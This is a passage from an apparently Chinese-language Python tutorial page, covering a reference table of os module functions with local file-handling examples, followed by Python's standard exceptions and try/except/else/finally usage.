fd2</td></tr><tr><td align="left">11</td><td align="left"><a href="https://www.runoob.com/python3/python3-os-fchdir.html">os.fchdir(fd)</a> 通过文件描述符改变当前工作目录</td></tr><tr><td align="left">12</td><td align="left"><a href="https://www.runoob.com/python3/python3-os-fchmod.html">os.fchmod(fd, mode)</a> 改变一个文件的访问权限，该文件由参数fd指定，参数mode是Unix下的文件访问权限。</td></tr><tr><td align="left">13</td><td align="left"><a href="https://www.runoob.com/python3/python3-os-fchown.html">os.fchown(fd, uid, gid)</a> 修改一个文件的所有权，这个函数修改一个文件的用户ID和用户组ID，该文件由文件描述符fd指定。</td></tr><tr><td align="left">14</td><td align="left"><a href="https://www.runoob.com/python3/python3-os-fdatasync.html">os.fdatasync(fd)</a> 强制将文件写入磁盘，该文件由文件描述符fd指定，但是不强制更新文件的状态信息。</td></tr><tr><td align="left">15</td><td align="left">[os.fdopen(fd<a href="https://www.runoob.com/python3/python3-os-fdopen.html">, mode[, bufsize]])</a> 通过文件描述符 fd 创建一个文件对象，并返回这个文件对象</td></tr><tr><td align="left">16</td><td align="left"><a href="https://www.runoob.com/python3/python3-os-fpathconf.html">os.fpathconf(fd, name)</a> 返回一个打开的文件的系统配置信息。name为检索的系统配置的值，它也许是一个定义系统值的字符串，这些名字在很多标准中指定（POSIX.1, Unix 95, Unix 98, 和其它）。</td></tr><tr><td align="left">17</td><td align="left"><a href="https://www.runoob.com/python3/python3-os-fstat.html">os.fstat(fd)</a> 返回文件描述符fd的状态，像stat()。</td></tr><tr><td align="left">18</td><td align="left"><a href="https://www.runoob.com/python3/python3-os-fstatvfs.html">os.fstatvfs(fd)</a> 返回包含文件描述符fd的文件的文件系统的信息，Python 3.3 相等于 statvfs()。</td></tr><tr><td align="left">19</td><td align="left"><a href="https://www.runoob.com/python3/python3-os-fsync.html">os.fsync(fd)</a> 强制将文件描述符为fd的文件写入硬盘。</td></tr><tr><td align="left">20</td><td align="left"><a href="https://www.runoob.com/python3/python3-os-ftruncate.html">os.ftruncate(fd, length)</a> 裁剪文件描述符fd对应的文件, 所以它最大不能超过文件大小。</td></tr><tr><td align="left">21</td><td align="left"><a href="https://www.runoob.com/python3/python3-os-getcwd.html">os.getcwd()</a> 返回当前工作目录</td></tr><tr><td align="left">22</td><td align="left"><a href="https://www.runoob.com/python3/python3-os-getcwdb.html">os.getcwdb()</a> 返回一个当前工作目录的Unicode对象</td></tr><tr><td align="left">23</td><td align="left"><a href="https://www.runoob.com/python3/python3-os-isatty.html">os.isatty(fd)</a> 如果文件描述符fd是打开的，同时与tty(-like)设备相连，则返回true, 否则False。</td></tr><tr><td align="left">24</td><td align="left"><a href="https://www.runoob.com/python3/python3-os-lchflags.html">os.lchflags(path, flags)</a> 设置路径的标记为数字标记，类似 chflags()，但是没有软链接</td></tr><tr><td align="left">25</td><td align="left"><a href="https://www.runoob.com/python3/python3-os-lchmod.html">os.lchmod(path, mode)</a> 修改连接文件权限</td></tr><tr><td align="left">26</td><td align="left"><a href="https://www.runoob.com/python3/python3-os-lchown.html">os.lchown(path, uid, gid)</a> 更改文件所有者，类似 chown，但是不追踪链接。</td></tr><tr><td align="left">27</td><td align="left"><a href="https://www.runoob.com/python3/python3-os-link.html">os.link(src, dst)</a> 创建硬链接，名为参数 dst，指向参数 src</td></tr><tr><td align="left">28</td><td align="left"><a href="https://www.runoob.com/python3/python3-os-listdir.html">os.listdir(path)</a> 返回path指定的文件夹包含的文件或文件夹的名字的列表。</td></tr><tr><td align="left">29</td><td align="left"><a href="https://www.runoob.com/python3/python3-os-lseek.html">os.lseek(fd, pos, how)</a> 设置文件描述符 fd当前位置为pos, how方式修改: SEEK_SET 或者 0 设置从文件开始的计算的pos; SEEK_CUR或者 1 则从当前位置计算; os.SEEK_END或者2则从文件尾部开始. 在unix，Windows中有效</td></tr><tr><td align="left">30</td><td align="left"><a href="https://www.runoob.com/python3/python3-os-lstat.html">os.lstat(path)</a> 像stat(),但是没有软链接</td></tr><tr><td align="left">31</td><td align="left"><a href="https://www.runoob.com/python3/python3-os-major.html">os.major(device)</a> 从原始的设备号中提取设备major号码 (使用stat中的st_dev或者st_rdev field)。</td></tr><tr><td align="left">32</td><td align="left"><a href="https://www.runoob.com/python3/python3-os-makedev.html">os.makedev(major, minor)</a> 以major和minor设备号组成一个原始设备号</td></tr><tr><td align="left">33</td><td align="left">[os.makedirs(path<a href="https://www.runoob.com/python3/python3-os-makedirs.html">, mode])</a> 递归文件夹创建函数。像mkdir(), 但创建的所有intermediate-level文件夹需要包含子文件夹。</td></tr><tr><td align="left">34</td><td align="left"><a href="https://www.runoob.com/python3/python3-os-minor.html">os.minor(device)</a> 从原始的设备号中提取设备minor号码 (使用stat中的st_dev或者st_rdev field )。</td></tr><tr><td align="left">35</td><td align="left">[os.mkdir(path<a href="https://www.runoob.com/python3/python3-os-mkdir.html">, mode])</a> 以数字mode的mode创建一个名为path的文件夹.默认的 mode 是 0777 (八进制)。</td></tr><tr><td align="left">36</td><td align="left">[os.mkfifo(path<a href="https://www.runoob.com/python3/python3-os-mkfifo.html">, mode])</a> 创建命名管道，mode 为数字，默认为 0666 (八进制)</td></tr><tr><td align="left">37</td><td align="left">[os.mknod(filename<a href="https://www.runoob.com/python3/python3-os-mknod.html">, mode=0600, device])</a> 创建一个名为filename文件系统节点（文件，设备特别文件或者命名pipe）。</td></tr><tr><td align="left">38</td><td align="left">[os.open(file, flags<a href="https://www.runoob.com/python3/python3-os-open.html">, mode])</a> 打开一个文件，并且设置需要的打开选项，mode参数是可选的</td></tr><tr><td align="left">39</td><td align="left"><a href="https://www.runoob.com/python3/python3-os-openpty.html">os.openpty()</a> 打开一个新的伪终端对。返回 pty 和 tty的文件描述符。</td></tr><tr><td align="left">40</td><td align="left"><a href="https://www.runoob.com/python3/python3-os-pathconf.html">os.pathconf(path, name)</a> 返回相关文件的系统配置信息。</td></tr><tr><td align="left">41</td><td align="left"><a href="https://www.runoob.com/python3/python3-os-pipe.html">os.pipe()</a> 创建一个管道. 返回一对文件描述符(r, w) 分别为读和写</td></tr><tr><td align="left">42</td><td align="left">[os.popen(command<a href="https://www.runoob.com/python3/python3-os-popen.html">, mode[, bufsize]])</a> 从一个 command 打开一个管道</td></tr><tr><td align="left">43</td><td align="left"><a href="https://www.runoob.com/python3/python3-os-read.html">os.read(fd, n)</a> 从文件描述符 fd 中读取最多 n 个字节，返回包含读取字节的字符串，文件描述符 fd对应文件已达到结尾, 返回一个空字符串。</td></tr><tr><td align="left">44</td><td align="left"><a href="https://www.runoob.com/python3/python3-os-readlink.html">os.readlink(path)</a> 返回软链接所指向的文件</td></tr><tr><td align="left">45</td><td align="left"><a href="https://www.runoob.com/python3/python3-os-remove.html">os.remove(path)</a> 删除路径为path的文件。如果path 是一个文件夹，将抛出OSError; 查看下面的rmdir()删除一个 directory。</td></tr><tr><td align="left">46</td><td align="left"><a href="https://www.runoob.com/python3/python3-os-removedirs.html">os.removedirs(path)</a> 递归删除目录。</td></tr><tr><td align="left">47</td><td align="left"><a href="https://www.runoob.com/python3/python3-os-rename.html">os.rename(src, dst)</a> 重命名文件或目录，从 src 到 dst</td></tr><tr><td align="left">48</td><td align="left"><a href="https://www.runoob.com/python3/python3-os-renames.html">os.renames(old, new)</a> 递归地对目录进行更名，也可以对文件进行更名。</td></tr><tr><td align="left">49</td><td align="left"><a href="https://www.runoob.com/python3/python3-os-rmdir.html">os.rmdir(path)</a> 删除path指定的空目录，如果目录非空，则抛出一个OSError异常。</td></tr><tr><td align="left">50</td><td align="left"><a href="https://www.runoob.com/python3/python3-os-stat.html">os.stat(path)</a> 获取path指定的路径的信息，功能等同于C API中的stat()系统调用。</td></tr><tr><td align="left">51</td><td align="left">[os.stat_float_times(<a href="https://www.runoob.com/python3/python3-os-stat_float_times.html">newvalue])</a> 决定stat_result是否以float对象显示时间戳</td></tr><tr><td align="left">52</td><td align="left"><a href="https://www.runoob.com/python3/python3-os-statvfs.html">os.statvfs(path)</a> 获取指定路径的文件系统统计信息</td></tr><tr><td align="left">53</td><td align="left"><a href="https://www.runoob.com/python3/python3-os-symlink.html">os.symlink(src, dst)</a> 创建一个软链接</td></tr><tr><td align="left">54</td><td align="left"><a href="https://www.runoob.com/python3/python3-os-tcgetpgrp.html">os.tcgetpgrp(fd)</a> 返回与终端fd（一个由os.open()返回的打开的文件描述符）关联的进程组</td></tr><tr><td align="left">55</td><td align="left"><a href="https://www.runoob.com/python3/python3-os-tcsetpgrp.html">os.tcsetpgrp(fd, pg)</a> 设置与终端fd（一个由os.open()返回的打开的文件描述符）关联的进程组为pg。</td></tr><tr><td align="left">56</td><td align="left">os.tempnam([dir[, prefix]]) <strong>Python3 中已删除。</strong>返回唯一的路径名用于创建临时文件。</td></tr><tr><td align="left">57</td><td align="left">os.tmpfile() <strong>Python3 中已删除。</strong>返回一个打开的模式为(w+b)的文件对象 .这文件对象没有文件夹入口，没有文件描述符，将会自动删除。</td></tr><tr><td align="left">58</td><td align="left">os.tmpnam() <strong>Python3 中已删除。</strong>为创建一个临时文件返回一个唯一的路径</td></tr><tr><td align="left">59</td><td align="left"><a href="https://www.runoob.com/python3/python3-os-ttyname.html">os.ttyname(fd)</a> 返回一个字符串，它表示与文件描述符fd 关联的终端设备。如果fd 没有与终端设备关联，则引发一个异常。</td></tr><tr><td align="left">60</td><td align="left"><a href="https://www.runoob.com/python3/python3-os-unlink.html">os.unlink(path)</a> 删除文件路径</td></tr><tr><td align="left">61</td><td align="left"><a href="https://www.runoob.com/python3/python3-os-utime.html">os.utime(path, times)</a> 返回指定的path文件的访问和修改的时间。</td></tr><tr><td align="left">62</td><td align="left">[os.walk(top[, topdown=True[, onerror=None[, followlinks=False]]])](<a href="https://www.runoob.com/python3/python3-os-walk.html">https://www.runoob.com/python3/python3-os-walk.html</a>) 输出在文件夹中的文件名通过在树中游走，向上或者向下。</td></tr><tr><td align="left">63</td><td align="left"><a href="https://www.runoob.com/python3/python3-os-write.html">os.write(fd, str)</a> 写入字符串到文件描述符 fd中. 返回实际写入的字符串长度</td></tr><tr><td align="left">64</td><td align="left"><a href="https://www.runoob.com/python3/python3-os-path.html">os.path 模块</a> 获取文件的属性信息。</td></tr><tr><td align="left">65</td><td align="left"><a href="https://www.runoob.com/python3/python3-os-pardir.html">os.pardir()</a> 获取当前目录的父目录，以字符串形式显示目录名。</td></tr></tbody></table><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> os<span class="token keyword">import</span> statret <span class="token operator">=</span> os<span class="token punctuation">.</span>access<span class="token punctuation">(</span><span class="token string">"D:/test.txt"</span><span class="token punctuation">,</span> os<span class="token punctuation">.</span>F_OK<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"F_OK - 返回值 %s"</span> <span class="token operator">%</span> ret<span class="token punctuation">)</span><span class="token comment"># F_OK - 返回值 True</span>ret <span class="token operator">=</span> os<span class="token punctuation">.</span>access<span class="token punctuation">(</span><span class="token string">"D:/test.txt"</span><span class="token punctuation">,</span> os<span class="token punctuation">.</span>R_OK<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"R_OK - 返回值 %s"</span> <span class="token operator">%</span> ret<span class="token punctuation">)</span><span class="token comment"># R_OK - 返回值 True</span>ret <span class="token operator">=</span> os<span class="token punctuation">.</span>access<span class="token punctuation">(</span><span class="token string">"D:/test.txt"</span><span class="token punctuation">,</span> os<span class="token punctuation">.</span>W_OK<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"W_OK - 返回值 %s"</span> <span class="token operator">%</span> ret<span class="token punctuation">)</span><span class="token comment"># W_OK - 返回值 True</span>ret <span class="token operator">=</span> os<span class="token punctuation">.</span>access<span class="token punctuation">(</span><span class="token string">"D:/test.txt"</span><span class="token punctuation">,</span> os<span class="token punctuation">.</span>X_OK<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"X_OK - 返回值 %s"</span> <span class="token operator">%</span> ret<span class="token punctuation">)</span><span class="token comment"># X_OK - 返回值 True</span>path <span class="token operator">=</span> <span class="token string">'D:/'</span><span class="token comment"># 查看当前工作目录</span>retval <span class="token operator">=</span> os<span class="token punctuation">.</span>getcwd<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"当前工作目录为 %s"</span> <span class="token operator">%</span> retval<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"当前工作目录 : %s"</span> <span class="token operator">%</span> os<span class="token punctuation">.</span>getcwdb<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 当前工作目录为 F:\</span><span class="token comment"># 修改当前工作目录</span>os<span class="token punctuation">.</span>chdir<span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token comment"># 查看修改后的工作目录</span>retval <span class="token operator">=</span> os<span class="token punctuation">.</span>getcwd<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"目录修改成功 %s"</span> <span class="token operator">%</span> retval<span class="token punctuation">)</span><span class="token comment"># 目录修改成功 D:\</span><span class="token comment"># path = '/tmp/foo.txt'</span><span class="token comment"># # 为文件设置标记，使得它不能被重命名和删除</span><span class="token comment"># flags = stat.SF_NOUNLINK</span><span class="token comment"># retval = os.chflags(path, flags)</span><span class="token comment"># print("返回值: %s" % retval)</span>path <span class="token operator">=</span> <span class="token string">'D:/test.txt'</span><span class="token keyword">import</span> os<span class="token punctuation">,</span> sys<span class="token punctuation">,</span> stat<span class="token comment"># 设置文件可以通过用户组执行</span>os<span class="token punctuation">.</span>chmod<span class="token punctuation">(</span><span class="token string">"D:/test.txt"</span><span class="token punctuation">,</span> stat<span class="token punctuation">.</span>S_IXGRP<span class="token punctuation">)</span><span class="token comment"># 设置文件可以被其他用户写入</span>os<span class="token punctuation">.</span>chmod<span class="token punctuation">(</span><span class="token string">"D:/test.txt"</span><span class="token punctuation">,</span> stat<span class="token punctuation">.</span>S_IWOTH<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"修改成功!!"</span><span class="token punctuation">)</span><span class="token comment"># 设置所有者 ID 为 100</span><span class="token comment"># os.chown("/tmp/foo.txt", 100, -1)</span><span class="token comment"># print("修改权限成功!!")</span><span class="token comment"># 设置根目录为 /tmp</span><span class="token comment"># os.chroot("/tmp")</span><span class="token comment"># print("修改根目录成功!!")</span><span class="token comment"># 打开文件</span><span class="token comment"># fd = os.open("foo.txt", os.O_RDWR | os.O_CREAT)</span><span class="token comment"># #  写入字符串</span><span class="token comment"># os.write(fd, "This is test")</span><span class="token comment"># d_fd = os.dup( fd )</span><span class="token comment"># # 关闭文件</span><span class="token comment"># os.close(fd)</span><span class="token comment"># print("关闭文件成功!!")</span><span class="token comment"># 创建的目录</span><span class="token comment"># path = "/tmp/home/monthly/daily/hourly"</span><span class="token comment">#</span><span class="token comment"># os.mkdir(path, 0o755)</span><span class="token comment">#</span><span class="token comment"># print("目录已创建")</span><span class="token comment"># 创建的目录</span><span class="token comment"># path = "/tmp/hourly"</span><span class="token comment">#</span><span class="token comment"># os.mkfifo(path, 0o644)</span><span class="token comment">#</span><span class="token comment"># print("路径被创建")</span><span class="token comment"># # 列出目录</span><span class="token comment"># print("目录为: %s" % os.listdir(os.getcwd()))</span><span class="token comment">#</span><span class="token comment"># # 移除</span><span class="token comment"># os.remove("aa.txt")</span><span class="token comment">#</span><span class="token comment"># # 移除后列出目录</span><span class="token comment"># print("移除后 : %s" % os.listdir(os.getcwd()))</span><span class="token comment"># os.renames(old, new)</span><span class="token comment"># # 列出目录</span><span class="token comment"># print("目录为: %s"%os.listdir(os.getcwd()))</span><span class="token comment">#</span><span class="token comment"># # 删除路径</span><span class="token comment"># os.rmdir("mydir")</span><span class="token comment">#</span><span class="token comment"># # 列出重命名后的目录</span><span class="token comment"># print("目录为: %s" %os.listdir(os.getcwd())</span><span class="token comment"># # 显示文件 "a2.py" 信息</span><span class="token comment"># statinfo = os.stat('a2.py')</span><span class="token comment">#</span><span class="token comment"># print(statinfo)</span><span class="token comment"># # 打开文件</span><span class="token comment"># fd = os.open("f1.txt", os.O_RDWR | os.O_CREAT)</span><span class="token comment">#</span><span class="token comment"># # 写入字符串</span><span class="token comment"># str = "This is runoob.com site"</span><span class="token comment"># ret = os.write(fd, bytes(str, 'UTF-8'))</span><span class="token comment">#</span><span class="token comment"># # 输入返回值</span><span class="token comment"># print("写入的位数为: ")</span><span class="token comment"># print(ret)</span><span class="token comment">#</span><span class="token comment"># print("写入成功")</span><span class="token comment">#</span><span class="token comment"># # 关闭文件</span><span class="token comment"># os.close(fd)</span><span class="token comment"># print("关闭文件成功!!")</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="错误和异常"><a href="#错误和异常" class="headerlink" title="错误和异常"></a>错误和异常</h2><h3 id="语法错误"><a href="#语法错误" class="headerlink" title="语法错误"></a>语法错误</h3><p>一般为漏写符号，或者拼写错误报错</p><p>语法分析器指出了出错的一行，并且在最先找到的错误的位置标记一个小小的箭头</p><h3 id="异常"><a href="#异常" class="headerlink" title="异常"></a>异常</h3><p>即便 Python 程序的语法是正确的，在运行它的时候，也有可能发生错误。运行期检测到的错误被称为异常</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token number">10</span> <span class="token operator">/</span> <span class="token number">0</span><span class="token punctuation">)</span>  <span class="token comment"># 除数不能为0报异常</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token number">2</span> <span class="token operator">+</span><span class="token string">'2'</span><span class="token punctuation">)</span>  <span class="token comment"># 类型不能相加，触发异常</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="python标准异常"><a href="#python标准异常" class="headerlink" title="python标准异常"></a>python标准异常</h3><table><thead><tr><th align="left">异常名称</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left"></td><td align="left"></td></tr><tr><td align="left">BaseException</td><td align="left">所有异常的基类</td></tr><tr><td align="left">SystemExit</td><td align="left">解释器请求退出</td></tr><tr><td align="left">KeyboardInterrupt</td><td align="left">用户中断执行(通常是输入^C)</td></tr><tr><td align="left">Exception</td><td align="left">常规错误的基类</td></tr><tr><td align="left">StopIteration</td><td align="left">迭代器没有更多的值</td></tr><tr><td align="left">GeneratorExit</td><td align="left">生成器(generator)发生异常来通知退出</td></tr><tr><td align="left">StandardError</td><td align="left">所有的内建标准异常的基类</td></tr><tr><td align="left">ArithmeticError</td><td align="left">所有数值计算错误的基类</td></tr><tr><td align="left">FloatingPointError</td><td align="left">浮点计算错误</td></tr><tr><td align="left">OverflowError</td><td align="left">数值运算超出最大限制</td></tr><tr><td align="left">ZeroDivisionError</td><td align="left">除(或取模)零 (所有数据类型)</td></tr><tr><td align="left">AssertionError</td><td align="left">断言语句失败</td></tr><tr><td align="left">AttributeError</td><td align="left">对象没有这个属性</td></tr><tr><td align="left">EOFError</td><td align="left">没有内建输入,到达EOF 标记</td></tr><tr><td align="left">EnvironmentError</td><td align="left">操作系统错误的基类</td></tr><tr><td align="left">IOError</td><td align="left">输入/输出操作失败</td></tr><tr><td align="left">OSError</td><td align="left">操作系统错误</td></tr><tr><td align="left">WindowsError</td><td align="left">系统调用失败</td></tr><tr><td align="left">ImportError</td><td align="left">导入模块/对象失败</td></tr><tr><td align="left">LookupError</td><td align="left">无效数据查询的基类</td></tr><tr><td align="left">IndexError</td><td align="left">序列中没有此索引(index)</td></tr><tr><td align="left">KeyError</td><td align="left">映射中没有这个键</td></tr><tr><td align="left">MemoryError</td><td align="left">内存溢出错误(对于Python 解释器不是致命的)</td></tr><tr><td align="left">NameError</td><td align="left">未声明/初始化对象 (没有属性)</td></tr><tr><td align="left">UnboundLocalError</td><td align="left">访问未初始化的本地变量</td></tr><tr><td align="left">ReferenceError</td><td align="left">弱引用(Weak reference)试图访问已经垃圾回收了的对象</td></tr><tr><td align="left">RuntimeError</td><td align="left">一般的运行时错误</td></tr><tr><td align="left">NotImplementedError</td><td align="left">尚未实现的方法</td></tr><tr><td align="left">SyntaxError</td><td align="left">Python 语法错误</td></tr><tr><td align="left">IndentationError</td><td align="left">缩进错误</td></tr><tr><td align="left">TabError</td><td align="left">Tab 和空格混用</td></tr><tr><td align="left">SystemError</td><td align="left">一般的解释器系统错误</td></tr><tr><td align="left">TypeError</td><td align="left">对类型无效的操作</td></tr><tr><td align="left">ValueError</td><td align="left">传入无效的参数</td></tr><tr><td align="left">UnicodeError</td><td align="left">Unicode 相关的错误</td></tr><tr><td align="left">UnicodeDecodeError</td><td align="left">Unicode 解码时的错误</td></tr><tr><td align="left">UnicodeEncodeError</td><td align="left">Unicode 编码时错误</td></tr><tr><td align="left">UnicodeTranslateError</td><td align="left">Unicode 转换时错误</td></tr><tr><td align="left">Warning</td><td align="left">警告的基类</td></tr><tr><td align="left">DeprecationWarning</td><td align="left">关于被弃用的特征的警告</td></tr><tr><td align="left">FutureWarning</td><td align="left">关于构造将来语义会有改变的警告</td></tr><tr><td align="left">OverflowWarning</td><td align="left">旧的关于自动提升为长整型(long)的警告</td></tr><tr><td align="left">PendingDeprecationWarning</td><td align="left">关于特性将会被废弃的警告</td></tr><tr><td align="left">RuntimeWarning</td><td align="left">可疑的运行时行为(runtime behavior)的警告</td></tr><tr><td align="left">SyntaxWarning</td><td align="left">可疑的语法的警告</td></tr><tr><td align="left">UserWarning</td><td align="left">用户代码生成的警告</td></tr></tbody></table><h3 id="异常处理"><a href="#异常处理" class="headerlink" title="异常处理"></a>异常处理</h3><h5 id="try-except"><a href="#try-except" class="headerlink" title="try/except"></a>try/except</h5><p>基本格式</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">try</span><span class="token punctuation">:</span>    执行代码<span class="token keyword">except</span><span class="token punctuation">:</span>    异常时执行的代码<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        x <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"请输入一个数字: "</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">break</span>    <span class="token keyword">except</span> ValueError<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"您输入的不是数字，请再次尝试输入！"</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">'''请输入一个数字: qq您输入的不是数字，请再次尝试输入！'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol><li>首先执行try字句</li><li>没有异常忽略except，结束try</li><li>如果有异常，忽略try语句发生异常后面的语句，执行与except中与try发生的异常相符的语句</li><li>如果没有相符的，那么这个异常将会传递给上层的 try 中</li></ol><p>一个except语句同时处理多个异常，这些异常将被放在一个括号里成为一个元组</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">except</span> <span class="token punctuation">(</span>RuntimeError<span class="token punctuation">,</span> TypeError<span class="token punctuation">,</span> NameError<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">pass</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>一个 try 语句可能包含多个except子句，分别来处理不同的特定的异常。最多只有一个分支会被执行。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> sys<span class="token keyword">try</span><span class="token punctuation">:</span>    f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'myfile.txt'</span><span class="token punctuation">)</span>    s <span class="token operator">=</span> f<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span>    i <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">except</span> OSError <span class="token keyword">as</span> err<span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"OS error: {0}"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">except</span> ValueError<span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Could not convert data to an integer."</span><span class="token punctuation">)</span><span class="token keyword">except</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Unexpected error:"</span><span class="token punctuation">,</span> sys<span class="token punctuation">.</span>exc_info<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">raise</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="try-except…else"><a href="#try-except…else" class="headerlink" title="try/except…else"></a>try/except…else</h5><p>基本格式</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">try</span><span class="token punctuation">:</span>    执行代码<span class="token keyword">except</span><span class="token punctuation">:</span>    异常时执行的代码<span class="token keyword">else</span><span class="token punctuation">:</span>    没有异常执行的代码<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">for</span> arg <span class="token keyword">in</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span>arg<span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span>    <span class="token keyword">except</span> IOError<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'cannot open'</span><span class="token punctuation">,</span> arg<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>arg<span class="token punctuation">,</span> <span class="token string">'has'</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>f<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'lines'</span><span class="token punctuation">)</span>        f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="try-finally-语句"><a href="#try-finally-语句" class="headerlink" title="try-finally 语句"></a>try-finally 语句</h5><p>基本格式</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">try</span><span class="token punctuation">:</span>    执行代码<span class="token keyword">except</span><span class="token punctuation">:</span>    异常时执行的代码<span class="token keyword">else</span><span class="token punctuation">:</span>    没有异常执行的代码<span class="token keyword">finally</span><span class="token punctuation">:</span>    无论如何都要执行的代码<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">try</span><span class="token punctuation">:</span>    runoob<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">except</span> AssertionError <span class="token keyword">as</span> error<span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>error<span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'file.log'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token builtin">file</span><span class="token punctuation">:</span>            read_data <span class="token operator">=</span> <span class="token builtin">file</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">except</span> FileNotFoundError <span class="token keyword">as</span> fnf_error<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>fnf_error<span class="token 